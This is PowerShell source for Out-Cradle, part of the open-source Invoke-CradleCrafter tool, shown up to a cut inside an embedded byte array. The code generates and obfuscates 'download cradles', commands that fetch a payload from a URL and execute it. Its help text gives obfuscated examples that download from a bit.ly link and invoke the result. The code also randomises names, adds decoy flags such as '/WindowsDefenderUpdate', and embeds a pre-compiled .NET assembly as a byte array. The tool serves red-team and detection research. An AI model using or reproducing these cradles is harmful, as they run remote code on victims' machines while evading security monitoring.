#   This file is part of Invoke-CradleCrafter.
#
#   Copyright 2018 Daniel Bohannon <@danielhbohannon>
#         while at Mandiant <http://www.mandiant.com>
#
#   Licensed under the Apache License, Version 2.0 (the "License");
#   you may not use this file except in compliance with the License.
#   You may obtain a copy of the License at
#
#       http://www.apache.org/licenses/LICENSE-2.0
#
#   Unless required by applicable law or agreed to in writing, software
#   distributed under the License is distributed on an "AS IS" BASIS,
#   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#   See the License for the specific language governing permissions and
#   limitations under the License.



Function Out-Cradle
{
<#
.SYNOPSIS

Orchestrates exploration, selection, construction, and obfuscation of remote download cradle syntaxes that are (mostly) PowerShell-based. This function is most easily used in conjunction with Invoke-CradleCrafter.ps1.

Invoke-CradleCrafter Function: Out-Cradle
Author: Daniel Bohannon (@danielhbohannon)
License: Apache License, Version 2.0
Required Dependencies: Set-GetSetVariables, Out-EncapsulatedInvokeExpression, Out-PsGetCmdlet, Out-GetVariable, and Out-SetVariable (all located in Out-Cradle.ps1)
Optional Dependencies: None

.DESCRIPTION

Out-Cradle orchestrates exploration, selection, construction, and obfuscation of remote download cradle syntaxes that are (mostly) PowerShell-based. This function is most easily used in conjunction with Invoke-CradleCrafter.ps1.

.PARAMETER Url

Specifies the Url of the staged payload to be downloaded and invoked by the remote download cradle payload.

.PARAMETER Path

(Optional) Specifies the Path to download the remote payload to for disk-based cradles.

.PARAMETER Cradle

Specifies the remote download cradle type/family to construct (and potentially obfuscate).

1  --> PsWebString      (New-Object Net.WebClient - DownloadString)
2  --> PsWebData        (New-Object Net.WebClient - DownloadData)
3  --> PsWebOpenRead    (New-Object Net.WebClient - OpenRead)
4  --> NetWebString     ([Net.WebClient]::New - DownloadString) - PS3.0+
5  --> NetWebData       ([Net.WebClient]::New - DownloadData)   - PS3.0+
6  --> NetWebOpenRead   ([Net.WebClient]::New - OpenRead)       - PS3.0+
7  --> PsWebRequest     (Invoke-WebRequest/IWR) - PS3.0+
8  --> PsRestMethod     (Invoke-RestMethod/IRM) - PS3.0+
9  --> NetWebRequest    ([Net.HttpWebRequest]::Create)
10 --> PsSendKeys       (New-Object -ComObject WScript.Shell).SendKeys
11 --> PsComWord        (COM Object With Microsoft Word)
12 --> PsComExcel       (COM Object With Microsoft Excel)
13 --> PsComIE          (COM Object With Internet Explorer)
14 --> PsComMsXml       (COM Object With MsXml2.ServerXmlHttp)
15 --> PsInlineCSharp   (Add-Type + Inline CSharp)
16 --> PsCompiledCSharp (Pre-Compiled CSharp + [Reflection.Assembly]::Load)
17 --> Certutil         (certutil.exe -ping)
20 --> PsWebFile        (New-Object Net.WebClient - DownloadFile)
21 --> PsBits           (Start-BitsTransfer)
22 --> BITSAdmin        (bitsadmin.exe)
23 --> Certutil         (certutil.exe -urlcache)

.PARAMETER TokenArray

Specifies the tokens that have been obfuscated from previous invocations of Out-Cradle so that state can be maintained for all randomized obfuscation selections.

.PARAMETER Command

(Optional) Specifies the post-cradle command to be invoked after the staged payload (stored at $Url) has been invoked.

.PARAMETER ReturnAsArray

(Optional) Specifies the return of both the plaintext cradle result as well as the tagged version for display purposes (used only when invoked from Invoke-CradleCrafter).

.EXAMPLE

C:\PS> Out-Cradle -Url 'http://bit.ly/L3g1tCrad1e' -Cradle 1 -TokenArray (@('Invoke',3),@('Rearrange',2))

$url='http://bit.ly/L3g1tCrad1e';$wc2='Net.WebClient';$wc=(New-Object $wc2);$ds='DownloadString';.(GCI Alias:\IE*)($wc.$ds.Invoke($url))

C:\PS> Out-Cradle -Url 'http://bit.ly/L3g1tCrad1e' -Cradle 3 -TokenArray (@('Rearrange',1),@('Invoke',9))

$url='http://bit.ly/L3g1tCrad1e';$wc2='Net.WebClient';$wc=(New-Object $wc2);$ds='OpenRead';$sr=New-Object IO.StreamReader($wc.$ds.Invoke($url));$res=$sr.ReadToEnd();$sr.Close();$res|.( ''.IndexOfAny.ToString()[114,7,84]-Join'')

.NOTES

Orchestrates exploration, selection, construction, and obfuscation of remote download cradle syntaxes that are (mostly) PowerShell-based. This function is most easily used in conjunction with Invoke-CradleCrafter.ps1.
This is a personal project developed by Daniel Bohannon while an employee at MANDIANT, A FireEye Company.

.LINK

http://www.danielbohannon.com
#>

    Param (
        [String]
        $Url = "http://bit.ly/L3g1tCrad1e",
        
        [String]
        $Path = 'Default_File_Path.ps1',

        [ValidateSet(1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,20,21,22,23)]
        [Int]
        $Cradle,
        
        [ValidateNotNullOrEmpty()]
        [Object[]]
        $TokenArray,
        
        [ScriptBlock]
        $Command = $NULL,

        [Switch]
        $ReturnAsArray
    )
    
    # PsSendKeys is notoriously finicky from a speed perspective depending on the target system it is running on.
    # Therefore you can adjust the sleep number in milliseconds between the SendKeys commands by adjusting the below variable.
    # On systems that are not overtaxed then a value of 500 or less works perfectly fine. Other systems work better with a value of 1500.
    $NotepadSendKeysSleep = 500

    # Convert Command from ScriptBlock to String.
    If($PSBoundParameters['Command'])
    {
        [String]$Command = [String]$Command
    }

    # If user input $Path is sourced then we will strip the source and only add it back when necessary later in this function.
    If($Path -Match '^.[/\\]')
    {
        $Path = $Path.SubString(2)
    }

    # I spent a large majority of development time on making the interactive user experience enjoyable and engaging.
    # Namely, I focused on highlighting the subtle (or not-so-subtle) changes in the command syntax with each applied obfuscation technique.
    # To do this there are a large number of variables that are randomly set that some or many launcher types rely on.
    # In order to keep things simple, these variables are set in the next section of this script before the launcher Switch block.

    # The state of all token(s) name/value pairs updated this iteration will be returned to Invoke-CradleCrafter.
    $Script:TokensUpdatedThisIteration = @()

    # Set a wide (ever-growing) array of randomized variable syntaxes to be available to all launcher types.
    # Flag substrings.
    $FullArgument              = "-ComObject"
    $ComObjectFlagSubString    = $FullArgument.SubString(0,(Get-Random -Minimum 2 -Maximum ($FullArgument.Length)))
    $FullArgument              = "-Seconds"
    $SecondsFlagSubString      = $FullArgument.SubString(0,(Get-Random -Minimum 2 -Maximum ($FullArgument.Length)))
    $FullArgument              = "-Milliseconds"
    $MillisecondsFlagSubString = $FullArgument.SubString(0,(Get-Random -Minimum 2 -Maximum ($FullArgument.Length)))
    $FullArgument              = "-Property"
    $PropertyFlagSubString     = $FullArgument.SubString(0,(Get-Random -Minimum 2 -Maximum ($FullArgument.Length)))
    $FullArgument              = "/Download"
    $DownloadFlagSubString     = $FullArgument.SubString(0,(Get-Random -Minimum 2 -Maximum ($FullArgument.Length)))
    
    # Helper random variables that will be used directly in below variables.
    $LikeFlagRandom             = Get-Random -Input @('-like','-clike','-ilike')
    $EqualFlagRandom            = Get-Random -Input @('-eq','-ieq','-ceq')
    $FirstLastFlagRandom        = Get-Random -Input @('-F','-Fi','-Fir','-Firs','-L','-La','-Las')
    $EncodingFlagRandom         = Get-Random -Input @('-En','-Enc','-Enco','-Encod','-Encodi','-Encodin')
    $LanguageFlagRandom         = Get-Random -Input @('-La','-Lan','-Lang','-Langu','-Langua','-Languag')
    $SourceFlagRandom           = Get-Random -Input @('-So','-Sou','-Sour','-Sourc')
    $DestinationFlagRandom      = Get-Random -Input @('-Dest','-Desti','-Destin','-Destina','-Destinat','-Destinati','-Destinatio')
    $ByteArgumentRandom         = Get-Random -Input @('Byte','3')
    $InvocationOperatorRandom   = Get-Random -Input @('.','&')
    $NewObjectWildcardRandom    = Get-Random -Input @('N*-O*','*w-*ct','N*ct','Ne*ct')
    $SelectObjectWildcardRandom = Get-Random -Input @('Se*-Ob*','Se*t-Ob*','Sel*-*ct','Sel*O*','*ct-Ob*','*ct-O*','*el*-O*')
    $GetCommandRandom           = Get-Random -Input @('Get-Command','GCM','COMMAND')
    $GetContentRandom           = Get-Random -Input @('Get-Content','GC','CONTENT','CAT','TYPE')
    $WhereObjectRandom          = Get-Random -Input @('Where-Object','Where','?')
    $ForEachRandom              = Get-Random -Input @('ForEach-Object','ForEach','%')
    $GetMemberRandom            = Get-Random -Input @('Get-Member','GM','Member')
    $GetMethodsGetMembersRandom = Get-Random -Input @('GetMethods()','GetMembers()')
    $MethodsOrMembersRandom     = Get-Random -Input @('Methods','Members')
    $SelectObjectRandom         = Get-Random -Input @('Select-Object','Select')
    $GetProcessRandom           = Get-Random -Input @('Get-Process','GPS','PS','Process')
    $GetHelpRandom              = Get-Random -Input @('Get-Help','Help','Man')
    $StartSleepWildcardRandom   = Get-Random -Input @('S*t-*p','*t-S*p','St*ep','*t-Sl*')
    $Void                       = Get-Random -Input @('[Void]','$Null=')
    $MZRandom                   = Get-Random -Input @('M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z')
    $DownloadFlagDecoyRandom    = Get-Random -Input @('/DMZ=Nonexistent','/DBO','/Download=Disabled','/Cancel','/Disable','/WindowsDefenderUpdate','/JobName=WindowsUpdate','/Troll=Strong')
    $DownloadFlagRandomString   = '/' + ((Get-Random -Input ([Char[]]'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ') -Count (Get-Random -Input @(5..10))) -Join '')
    $SleepArguments             = Get-Random -Input @("$SecondsFlagSubString 1","1","$MillisecondsFlagSubString 1000")
    $SleepMillisecondsArguments = "$MillisecondsFlagSubString $NotepadSendKeysSleep"

    # Generate numerous ways to reference the current item variable, including Get-Variable varname, Get-ChildItem Variable:varname, Get-Item Variable:varname, etc.
    $CurrentItemVariable  = Out-GetVariable '_'
    $CurrentItemVariable2 = Out-GetVariable '_'
    
    # Generate numerous ways to invoke with $ExecutionContext as a variable, including Get-Variable varname, Get-ChildItem Variable:varname, Get-Item Variable:varname, etc.
    $ExecContextVariable  = @()
    $ExecContextVariable += '$ExecutionContext'
    $ExecContextVariable += Out-GetVariable (Get-Random -Input @('Ex*xt','E*t','*xec*t','*ecu*t','*cut*t','*cuti*t','*uti*t','E*ext','E*xt','E*Cont*','E*onte*','E*tex*'))
    # Select random option from above.
    $ExecContextVariable = Get-Random -Input $ExecContextVariable

    # Generate random syntax for various members and methods for ExecutionContext variable.
    $NewScriptBlockWildcardRandom = Get-Random -Input @('N*','*k','*ck','*lock','N*S*B*','*r*ock','N*i*ck','*r*ock','*w*i*ck','*w*o*k','*S*i*ck')
    $InvokeScriptWildcardRandom   = Get-Random -Input @('I*','In*','I*t','*S*i*t','*n*o*t','*k*i*t','*ke*pt','*v*ip*','*pt','*k*ript')
    $GetCmdletWildcardRandom      = Get-Random -Input @('G*Cm*t','G*t','*Cm*t','*md*t','*dl*t','*let','*et','*m*t')
    $GetCmdletsWildcardRandom     = Get-Random -Input @('*ts','Ge*ts','G*ts','*Cm*ts','*md*ts','*dl*ts','*lets','*ets','*m*ts')
    $GetCommandWildcardRandom     = Get-Random -Input @('G*d','*and','*nd','*d','G*o*d','*Co*d','*t*om*d','*mma*d','*ma*d','G*a*d','*t*a*d')
    $GetCommandNameWildcardRandom = Get-Random -Input @('G*om*e','*nd*e','*Com*e','*om*e','*dName','*Co*me','*Com*e','*man*Name')
    $InvokeCommand                = Get-Random -Input @('InvokeCommand' ,"(($ExecContextVariable|$GetMemberRandom)[6].Name)")
    $NewScriptBlock               = Get-Random -Input @('NewScriptBlock',"(($ExecContextVariable.$InvokeCommand.PsObject.Methods|$WhereObjectRandom{$CurrentItemVariable.Name$LikeFlagRandom'$NewScriptBlockWildcardRandom'}).Name).Invoke","(($ExecContextVariable.$InvokeCommand|$GetMemberRandom|$WhereObjectRandom{$CurrentItemVariable.Name$LikeFlagRandom'$NewScriptBlockWildcardRandom'}).Name).Invoke")
    $InvokeScript                 = Get-Random -Input @('InvokeScript'  ,"(($ExecContextVariable.$InvokeCommand.PsObject.Methods|$WhereObjectRandom{$CurrentItemVariable.Name$LikeFlagRandom'$InvokeScriptWildcardRandom'}).Name).Invoke","(($ExecContextVariable.$InvokeCommand|$GetMemberRandom|$WhereObjectRandom{$CurrentItemVariable.Name$LikeFlagRandom'$InvokeScriptWildcardRandom'}).Name).Invoke")
    $GetCmdlet                    = Get-Random -Input @('GetCmdlet'     ,"(($ExecContextVariable.$InvokeCommand|$GetMemberRandom)[2].Name).Invoke","(($ExecContextVariable.$InvokeCommand.PsObject.Methods|$WhereObjectRandom{$CurrentItemVariable.Name$LikeFlagRandom'$GetCmdletWildcardRandom'}).Name).Invoke","(($ExecContextVariable.$InvokeCommand|$GetMemberRandom|$WhereObjectRandom{$CurrentItemVariable.Name$LikeFlagRandom'$GetCmdletWildcardRandom'}).Name).Invoke")
    $GetCmdlets                   = Get-Random -Input @('GetCmdlets'    ,"(($ExecContextVariable.$InvokeCommand.PsObject.Methods|$WhereObjectRandom{$CurrentItemVariable.Name$LikeFlagRandom'$GetCmdletsWildcardRandom'}).Name).Invoke","(($ExecContextVariable.$InvokeCommand|$GetMemberRandom|$WhereObjectRandom{$CurrentItemVariable.Name$LikeFlagRandom'$GetCmdletsWildcardRandom'}).Name).Invoke")
    $GetCommand                   = Get-Random -Input @('GetCommand'    ,"(($ExecContextVariable.$InvokeCommand.PsObject.Methods|$WhereObjectRandom{$CurrentItemVariable.Name$LikeFlagRandom'$GetCommandWildcardRandom'}).Name).Invoke","(($ExecContextVariable.$InvokeCommand|$GetMemberRandom|$WhereObjectRandom{$CurrentItemVariable.Name$LikeFlagRandom'$GetCommandWildcardRandom'}).Name).Invoke")
    $GetCommandName               = Get-Random -Input @('GetCommandName',"(($ExecContextVariable.$InvokeCommand.PsObject.Methods|$WhereObjectRandom{$CurrentItemVariable.Name$LikeFlagRandom'$GetCommandNameWildcardRandom'}).Name).Invoke","(($ExecContextVariable.$InvokeCommand|$GetMemberRandom|$WhereObjectRandom{$CurrentItemVariable.Name$LikeFlagRandom'$GetCommandNameWildcardRandom'}).Name).Invoke")

    # Create random variable names with random case for certain remote download syntax options.
    # If a launcher is added that requires more random variables than is defined in below $NumberOfRandomVars variable then increase this variable below.
    $VarNameCharacters = @('a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','0','1','2','3','4','5','6','7','8','9')
    $NumberOfRandomVars = 8
    $RandomVarArray = @()
    # This $ExistingVariables logic is only included to prevent variable collisions when mass testing is performed in a single PowerShell session.
    # However, some collisions may still occur given the nature of wildcard syntaxes used in certain obfuscation techniques.
    $ExistingVariables = (Get-Variable).Name
    For($i=1; $i -lt $NumberOfRandomVars+1; $i++)
    {
        $RandomVarName = (Get-Random -Input $VarNameCharacters -Count (Get-Random -Input @(1..3)) | ForEach-Object {$Char = $_; If(Get-Random -Input (0..1)){$Char = $Char.ToString().ToUpper()} $Char}) -Join ''

        While(($RandomVarArray + $ExistingVariables) -Contains $RandomVarName)
        {
            # To ensure different random variable names, keep choosing random values for $RandomVarName until it does not match any variable names in $RandomVarArray.
            $RandomVarName = (Get-Random -Input $VarNameCharacters -Count (Get-Random -Input @(1..5)) | ForEach-Object {$Char = $_; If(Get-Random -Input (0..1)){$Char = $Char.ToString().ToUpper()} $Char}) -Join ''
        }

        $RandomVarArray += $RandomVarName
        Set-Variable ('RandomVarName' + $i) $RandomVarName
    }

    # To create a more consistent experience, many launcher command component are compromised of other components that can be selectively obfuscated in Invoke-CradleCrafter.
    # In order to enable these sub-components to be changed across the board, many TAGS are set below.
    # These TAGS are used in the syntax during variable initialization and replaced in the launcher Switch block.
    $VarTag1                  = '<VAR1TAG>'
    $VarTag2                  = '<VAR2TAG>'
    $JoinTag                  = '<VALUETOJOINTAG>'
    $ByteTag                  = '<BYTEARRAYTAG>'
    $InvokeTag                = '<INVOKETAG>'
    $CommandTag               = '<COMMANDTAG>'
    $CommandEscapedStringTag  = "<COMMANDESCAPEDSTRINGTAG>"
    $NewObjectTag             = "<NEWOBJECTTAG>"
    $NewObjectNetWebClientTag = "<NEWOBJECTNETWEBCLIENTTAG>"
    $NetHttpWebRequestTag     = "<NETHTTPWEBREQUESTTAG>"
    $SRSetVarTag              = "<STREAMREADERSETVARIABLETAG>"
    $SRGetVarTag              = "<STREAMREADERGETVARIABLETAG>"
    $WRSetVarTag              = "<WEBREQUESTSETVARIABLETAG>"
    $WRGetVarTag              = "<WEBREQUESTGETVARIABLETAG>"
    $ResultSetVarTag          = "<RESULTSETVARIABLETAG>"
    $ResultGetVarTag          = "<RESULTGETVARIABLETAG>"
    $GPGetVarTag              = "<GETITEMPROPERTYSETVARIABLETAG>"
    $iWindowPosYTag           = "<IWINDOWSPOSYTAG>"
    $ResponseTag              = "<WEBREQUESTRESPONSETAG>"
    $OpenReadTag              = "<OPENREADTAG>"
    $UrlTag                   = "<URLTAG>"
    $DocumentTag              = '<DOCUMENTPROPERTYTAG>'
    $DocumentsTag             = '<DOCUMENTSPROPERTYTAG>'
    $BodyTag                  = '<BODYPROPERTYTAG>'
    $ContentTag               = '<CONTENTTAG>'
    $GetItemPropertyTag       = '<GETITEMPROPERTYTAG>'
    $ModuleAutoLoadTag        = '<MODULEAUTOLOADTAG>'
    $ReflectionAssemblyTag    = '<REFLECTIONASSEMBLYTAG>'
    $WScriptShellTag          = '<WSCRIPTSHELLTAG>'
    $WindowsFormsClipboardTag = '<WINDOWSFORMSCLIPBOARDTAG>'
    $ReadToEndTag             = '<CONTENTTOREADTOENDTAG>'
    $ComMemberTag             = '<COMMEMBERTAG>'
    $NewLineTag               = '<NEWLINETAG>'
    $JoinNewLineTag           = '<VALUETOJOINTAG>'
    $SheetsTag                = '<SHEETSTAG>'
    $ItemTag                  = '<ITEMTAG>'
    $UsedRangeTag             = '<USEDRANGETAG>'
    $RowsTag                  = '<ROWSTAG>'
    $PathTag                  = '<PATHTAG>'
    $InlineScriptTag          = '<INLINESCRIPTTAG>'
    $InlineCommandParamTag    = '<INLINECOMMANDPARAMTAG>'
    $InlineCommandTag         = '<INLINECOMMANDTAG>'

    # Set $Invoke and $InvokeWithTags variables to $InvokeTag as default.
    # If it is currently selected to obfuscate or a set value has been passed in then this default value will be overwritten.
    $Invoke         = $InvokeTag
    $InvokeWithTags = $InvokeTag

    # Wildcard values for various methods used in below $OptionsVarArr.
    $DownloadStringWildcardRandom      = Get-Random -Input @('D*g','*wn*g','*nl*g','*wn*d*g')
    $DownloadDataWildcardRandom        = Get-Random -Input @('D*a','*wn*a','*nl*a','*wn*d*a')
    $DownloadFileWildcardRandom        = Get-Random -Input @('Do*e','D*le','D*ile','Dow*i*le','D*ad*i*e','Do*o*d*le','Do*o*F*e','*w*i*le','*w*o*e','*w*ad*e','*n*ile','*n*o*d*e')
    $OpenReadWildcardRandom            = Get-Random -Input @('O*ad','Op*ad','*ad','*Read','*pe*ead')
    $ReadToEndWildcardRandom           = Get-Random -Input @('R*nd','R*To*d','R*a*nd','Re*To*nd','*nd','*To*nd')
    $BusyWildcardRandom                = Get-Random -Input @('B*','*sy','B*y','*usy','Bu*y')
    $DocumentWildcardRandom            = Get-Random -Input @('D*','*ment','D*t','Do*t','*cu*t','Do*nt','*o*u*e*t')
    $DocumentsWildcardRandom           = Get-Random -Input @('Do*ts','D*nts','D*cu*ts','D*men*s','D*o*men*s','Do*nts','D*ents')
    $BodyWildcardRandom                = Get-Random -Input @('bo*','b*y','bo*y','b*dy','bo*')
    $InnerTextWildcardRandom           = Get-Random -Input @('inn*t','inn*t','inn*ext','inn*t','o*Text','ou*t','o*ext','o*xt','o*rTex*')
    $InvokeWebRequestWildcardRandom    = Get-Random -Input @('I*st','In*k*t','I*-Web*','I*que*','*quest','I*e*e*e*e*t','I*v*W*R*t')
    $InvokeRestMethodWildcardRandom    = Get-Random -Input @('I*R*od','*-R*od','*-Re*d','I*vo*t*e*d','*v*est*e*d','*R*od','*k*Rest*')
    $GetItemPropertyWildcardRandom     = Get-Random -Input @('G*-I*y','G*-Ite*y','G*-I*ty','G*em*y','G*I*emP*y')
    $SetItemPropertyWildcardRandom     = Get-Random -Input @('S*-I*y','S*-Ite*y','S*-I*ty','S*em*y','S*I*emP*y')
    $LoadWithPartialNameWildcardRandom = Get-Random -Input @('L*me','*W*h*i*N*e','*W*h*i*l*e','*d*i*N*e','*d*i*me','*a*a*a*a*','L*ame','*d*art*','*th*i*N*','*Pa*i*N*','L*i*r*a*')
    $LoadWildcardRandom                = Get-Random -Input @('L*d','Lo*d','L*ad','L*o*d','L*a*d')
    $OpenWildcardRandom                = Get-Random -Input @('O*n','Op*n','O*en')
    $ItemWildcardRandom                = Get-Random -Input @('I*em','I*m','It*','Ite*','*m','*em','*tem','*t*m')
    $AddTypeWildcardRandom             = Get-Random -Input @('A*pe','A*-T*e','*-Ty*e','A*-T*p*e','A*-Ty*')
    $StartBitsTransferWildcardRandom   = Get-Random -Input @('St*fer','St*B*er','Sta*Bi*','*ar*Bi*s*','*art*i*s*ans*','*ta*i*s*Tr*an*','St*i*Trans*','*art*i*s*ra*r')
   
    # Random and obscure commands that will produce no output but will cause module auto-loading to occur for PS3.0+ which is required before certain 1.0 syntaxes for GetCmdlet and GetCommand will work.
    # "Import-Module/IPMO Microsoft.PowerShell.Management" would also do the trick, but the below options are much more subtle -- and fun :)
    $ModuleAutoLoadRandom = (Get-Random -Input @('cd','sl','ls pena*','ls _-*','ls sl*','ls panyo*','dir ty*','dir rid*','dir ect*','item ize*','item *z','popd','pushd','gdr -*')) + ';'

    # Random values for SendKeys cradle types.
    $SendKeysEnter         = Get-Random -Input @('~','{ENTER}')
    $WindowsFormsScreen    = Get-Random -Input @('[System.Windows.Forms.Screen]','[Windows.Forms.Screen]')
    $WindowsFormsClipboard = Get-Random -Input @('System.Windows.Forms.Clipboard','Windows.Forms.Clipboard')
    $ClearClipboard        = Get-Random -Input @('Clear()',"SetText(' ')")
    $ScreenHeight          = Get-Random -Input @("Split('=')[5].Split('}')[0]","Split('}')[0].Split('=')[5]")
    $LessThanTwoRandom     = Get-Random -Input @(' -lt 2',' -le 1')

    # Random class and method name for $ClassAndMethodOptions.
    $Random2ElementArray  = @()
    $Random2ElementArray += (Get-Random -Input ([Char[]]'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ') -Count (Get-Random -Input @(5..10))) -Join ''
    $Random2ElementArray += (Get-Random -Input ([Char[]]'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ') -Count (Get-Random -Input @(5..10))) -Join ''

    # Additional variables for below $OptionsVarArr.
    $SystemIOStreamReader     = Get-Random -Input @('System.IO.StreamReader','IO.StreamReader')
    $WhileReadByteSyntax      = @()
    $WhileReadByteSyntax     += "$ResultSetVarTag'';Try{While(1){$ResultGetVarTag+=[Char]$WRGetVarTag.ReadByte()}}Catch{}"
    $WhileReadByteSyntax     += "$ResultSetVarTag'';Try{While($ResultGetVarTag+=[Char]$WRGetVarTag.ReadByte()){}}Catch{}"
    $WhileReadByte            = Get-Random -Input $WhileReadByteSyntax
    $ReadToEndRandom          = Get-Random -Input @("$ReadToEndTag.ReadToEnd()","($ReadToEndTag|$ForEachRandom{$CurrentItemVariable.(($CurrentItemVariable2|$GetMemberRandom|$WhereObjectRandom{$CurrentItemVariable.Name$LikeFlagRandom'$ReadToEndWildcardRandom'}).Name).Invoke()})")
    $StringConversionWithTags = Get-Random -Input @("$ResponseTag.ToString()","([String]$ResponseTag)","($ResponseTag-As'String')")

    # Create large set of possible legit-sounding Class and Method combinations using misspelled Class names and the correctly-spelled Methods for each Class. (For Inline Scripting cradles)
    $LegitSoundingClassAndMethodInline  =   @()
    $LegitSoundingClassAndMethodInline += , @('Arrays'        , (Get-Random -Input @('AsReadOnly','BinarySearch','Clear','ConstrainedCopy','ConvertAll','Copy','CreateInstance','Empty','Equals','Exists','Find','FindAll','FindIndex','FindLast','FindLastIndex','ForEach','IndexOf','LastIndexOf','ReferenceEquals','Resize','Reverse','Sort','TrueForAll')))
    $LegitSoundingClassAndMethodInline += , @('Chars'         , (Get-Random -Input @('ConvertFromUtf32','ConvertToUtf32','Equals','GetNumericValue','GetUnicodeCategory','IsControl','IsDigit','IsHighSurrogate','IsLetter','IsLetterOrDigit','IsLower','IsLowSurrogate','IsNumber','IsPunctuation','IsSeparator','IsSurrogate','IsSurrogatePair','IsSymbol','IsUpper','IsWhiteSpace','Parse','ReferenceEquals','ToLower','ToLowerInvariant','ToString','ToUpper','ToUpperInvariant','TryParse')))
    $LegitSoundingClassAndMethodInline += , @('Conso1e'       , (Get-Random -Input @('Beep','Clear','Equals','MoveBufferArea','OpenStandardError','OpenStandardInput','OpenStandardOutput','Read','ReadKey','ReadLine','ReferenceEquals','ResetColor','SetBufferSize','SetCursorPosition','SetError','SetIn','SetOut','SetWindowPosition','SetWindowSize','Write','WriteLine')))
    $LegitSoundingClassAndMethodInline += , @('Net_WebClient' , (Get-Random -Input @('Equals','ReferenceEquals')))
    $LegitSoundingClassAndMethodInline += , @('ScriptB1ock'   , (Get-Random -Input @('Create','Equals','ReferenceEquals')))
    $LegitSoundingClassAndMethodInline += , @('Strings'       , (Get-Random -Input @('Compare','CompareOrdinal','Concat','Copy','Equals','Format','Intern','IsInterned','IsNullOrEmpty','IsNullOrWhiteSpace','Join','ReferenceEquals')))
    $LegitSoundingClassAndMethodInline += , @('Text_Encoding' , (Get-Random -Input @('Convert','Equals','GetEncoding','GetEncodings','ReferenceEquals','RegisterProvider')))
    $LegitSoundingClassAndMethodInline += , @('Types'         , (Get-Random -Input @('Equals','GetType','GetTypeArray','GetTypeCode','GetTypeFromCLSID','GetTypeFromHandle','GetTypeFromProgID','GetTypeHandle','ReferenceEquals','ReflectionOnlyGetType')))
    $LegitSoundingClassAndMethodInline += , @('WM1'           , (Get-Random -Input @('Create','Equals','ReferenceEquals')))
    $LegitSoundingClassAndMethodInline += , @('WmiC1ass'      , (Get-Random -Input @('Create','Equals','ReferenceEquals')))
    $LegitSoundingClassAndMethodInline += , @('XM1'           , (Get-Random -Input @('Equals','ReferenceEquals')))
    $LegitSoundingClassAndMethodInline  = Get-Random -Input $LegitSoundingClassAndMethodInline

    # Set pre-compiled CSharp sample values for some level of randomness when PsCompiledCSharp cradles are generated from a non-Windows OS where csc.exe is not present.

    # Set common compiled header here to save space in below arrays of pre-compiled CSharp values for machines running this script and csc.exe is not present.
    $CompiledHeader = '@(77,90,144,0,3,0,0,0,4,0,0,0,255,255,0,0,184)+@(0)*7+@(64)+@(0)*35+@(128,0,0,0,14,31,186,14,0,180,9,205,33,184,1,76,205,33,84,104,105,115,32,112,114,111,103,114,97,109,32,99,97,110,110,111,116,32,98,101,32,114,117,110,32,105,110,32,68,79,83,32,109,111,100,101,46,13,13,10,36)+@(0)*7+@(80,69,0,0,76,1,3,0,'

    $LegitSoundingClassAndMethodCompiledDefault  =   @()
    $LegitSoundingClassAndMethodCompiledDefault += , @('Class'         ,'Method'             , @("$CompiledHeader`128,36,17,89)+@(0)*8+@(224,0,2,33,11,1,8,0,0,4,0,0,0,6,0,0,0,0,0,0,110,35,0,0,0,32,0,0,0,64,0,0,0,0,64,0,0,32,0,0,0,2,0,0,4)+@(0)*7+@(4)+@(0)*8+@(128,0,0,0,2,0,0,0,0,0,0,3,0,64,133,0,0,16,0,0,16,0,0,0,0,16,0,0,16,0,0,0,0,0,0,16)+@(0)*11+@(32,35,0,0,75,0,0,0,0,64,0,0,160,2)+@(0)*19+@(96,0,0,12)+@(0)*52+@(32,0,0,8)+@(0)*11+@(8,32,0,0,72)+@(0)*11+@(46,116,101,120,116,0,0,0,116,3,0,0,0,32,0,0,0,4,0,0,0,2)+@(0)*14+@(32,0,0,96,46,114,115,114,99,0,0,0,160,2,0,0,0,64,0,0,0,4,0,0,0,6)+@(0)*14+@(64,0,0,64,46,114,101,108,111,99,0,0,12,0,0,0,0,96,0,0,0,2,0,0,0,10)+@(0)*14+@(64,0,0,66)+@(0)*16+@(80,35,0,0,0,0,0,0,72,0,0,0,2,0,5,0,120,32,0,0,168,2,0,0,1)+@(0)*55+@(19,48,2,0,17,0,0,0,1,0,0,17,0,115,3,0,0,10,2,40,4,0,0,10,10,43,0,6,42,30,2,40,5,0,0,10,42,0,0,0,66,83,74,66,1,0,1,0,0,0,0,0,12,0,0,0,118,50,46,48,46,53,48,55,50,55,0,0,0,0,5,0,108,0,0,0,12,1,0,0,35,126,0,0,120,1,0,0,204,0,0,0,35,83,116,114,105,110,103,115,0,0,0,0,68,2,0,0,8,0,0,0,35,85,83,0,76,2,0,0,16,0,0,0,35,71,85,73,68,0,0,0,92,2,0,0,76,0,0,0,35,66,108,111,98)+@(0)*7+@(2,0,0,1,71,21,2,0,9,0,0,0,0,250,1,51,0,22,0,0,1,0,0,0,4,0,0,0,2,0,0,0,2,0,0,0,1,0,0,0,5,0,0,0,2,0,0,0,1,0,0,0,1,0,0,0,2,0,0,0,0,0,10,0,1,0,0,0,0,0,6,0,43,0,36,0,6,0,95,0,63,0,6,0,127,0,63,0,10,0,179,0,168,0,0,0,0,0,1,0,0,0,0,0,1,0,1,0,1,0,16,0,21,0,0,0,5,0,1,0,1,0,80,32,0,0,0,0,150,0,50,0,10,0,1,0,109,32,0,0,0,0,134,24,57,0,15,0,2,0,0,0,1,0,164,0,17,0,57,0,19,0,25,0,57,0,15,0,33,0,57,0,15,0,33,0,189,0,24,0,9,0,57,0,15,0,46,0,11,0,33,0,46,0,19,0,42,0,29,0,4,128)+@(0)*16+@(157,0,0,0,2)+@(0)*11+@(1,0,27,0,0,0,0,0,2)+@(0)*11+@(1,0,36)+@(0)*8+@(60,77,111,100,117,108,101,62,0,99,114,97,100,108,101,46,100,108,108,0,67,108,97,115,115,0,109,115,99,111,114,108,105,98,0,83,121,115,116,101,109,0,79,98,106,101,99,116,0,77,101,116,104,111,100,0,46,99,116,111,114,0,83,121,115,116,101,109,46,82,117,110,116,105,109,101,46,67,111,109,112,105,108,101,114,83,101,114,118,105,99,101,115,0,67,111,109,112,105,108,97,116,105,111,110,82,101,108,97,